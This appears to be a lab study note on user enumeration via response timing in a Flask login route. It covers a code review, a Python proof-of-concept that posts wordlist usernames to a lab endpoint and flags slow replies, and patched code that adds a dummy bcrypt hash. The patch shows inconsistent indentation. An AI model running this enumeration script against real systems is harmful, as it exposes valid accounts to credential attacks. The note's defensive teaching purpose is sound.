# User Enumeration via Response Timing

# **Code Review - Identifying the Vulnerability**

```python
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(60))

    def __init__(self, username, password):
        self.username = username
        self.password = password

<SNIP>

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    username = request.form['username']
    user = User.query.filter_by(username=username).first()

    if not user:
        return render_template('index.html', message='Incorrect Details', type='danger')

    pw = request.form['password']
    pw_hash = bcrypt.hashpw(pw.encode(), salt)

    if pw_hash == user.password:
        session['logged_in'] = True
        session['user'] = user.username
        return redirect(url_for('index'))

    return render_template('index.html', message='Incorrect Details', type='danger')
```

1. The database is searched for the user with the provided username
2. If there is no such user, an `Incorrect Details` error message is returned
3. Otherwise, the password is hashed and compared with the hash stored in the database
4. If the passwords match, the login is successful
5. Otherwise, the `Incorrect Details` error message is displayed

## Why this happens

The DB querie only checks the username and returns a page directly if the username was not found. If the user is found, the password will be hashed and checked which takes more time. Another options could be that the username and password will be used in a single query, but calculating the hash takes longer, the longer the password is.

## PoC

- Python PoC did not work at all
- Burpsuite Intruder was way better and faster
- Code
    
    ```python
    import requests
    import time
    
    WORDLIST = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
    THRESHOLD_S = 0.050
    URL = "http://94.237.57.114:34086/reset"
    status = 0
    valid_usernames = []
    
    session = requests.Session()
    
    with open(WORDLIST, 'r') as f:
        usernames = [line.strip() for line in f]
    
    start_time = time.time()
    
    for username in usernames:
        response = session.post(URL, data=username)
        elapsed = response.elapsed.total_seconds()
        status += 1
    
        if elapsed > THRESHOLD_S:
            valid_usernames.append((username, elapsed))
            print(f"[+] VALID USERNAME: {username} - {elapsed:.4f}s")
    
        # print status every 100 usernames to reduce I/O overhead
        if status % 100 == 0:
            print(f"Checked: {status}/{len(usernames)} usernames")
    
    total_time = time.time() - start_time
    
    print("\nScan completed!")
    print(f"Total checked: {status} usernames in {total_time:.2f}s")
    print(f"Valid usernames ({len(valid_usernames)}):")
    for user, elapsed in valid_usernames:
        print(f" - {user} [{elapsed:.4f}s]")
    ```
    

<aside>
💡

This can happen in any endpoint where we can supply usernames. For example: `register` `reset` etc.

</aside>

# **Prevention & Patching**

General prevention of timing-based vulnerabilities is difficult and depends on each web application's security issue(s). In our sample case, it suffices to do the database lookup based on username and password combined and only distinguish whether it was successful. The relevant code would then look like this:

Code: python

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    username = request.form['username']
    pw = request.form['password']
    pw_hash = bcrypt.hashpw(pw.encode(), salt)
    user = User.query.filter_by(username=username, password=pw_hash).first()

    if user:
        session['logged_in'] = True
        session['user'] = user.username
        return redirect(url_for('index'))

    return render_template('index.html', message="Incorrect Details", type="danger")

```

Instead of querying the database only for the username, we do a combined lookup based on the username and the password hash.

However, in some instances, this is impossible. Consider a setting where the web application stores an individual password salt for each user. In that case, we can only compute the password hash after doing the database lookup based on the username. In these cases, we can eliminate the timing difference caused by the hashing of the password for valid users by hashing a dummy value if the username is invalid. In that case, the code would look similar to this:

Code: python

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    username = request.form['username']
    user = User.query.filter_by(username=username).first()

    if not user:
	    pw_hash = bcrypt.hashpw(b'dummyvalue', salt)
        return render_template('index.html', message='Incorrect Details', type='danger')

    pw = request.form['password']
    pw_hash = bcrypt.hashpw(pw.encode(), salt)

    if pw_hash == user.password:
        session['logged_in'] = True
        session['user'] = user.username
        return redirect(url_for('index'))

    return render_template('index.html', message='Incorrect Details', type='danger')

```

Note that the web application hashes the value `dummyvalue` when the username is invalid. Thus, the `bcrypt` hash function is called whether the user is valid or invalid, resulting in no noticeable timing difference. However, this approach creates load on the server even for invalid usernames. Therefore, it is vital to implement proper rate-limiting on the login endpoint to eliminate the possibility of server overload and, subsequently, denial-of-service (DoS).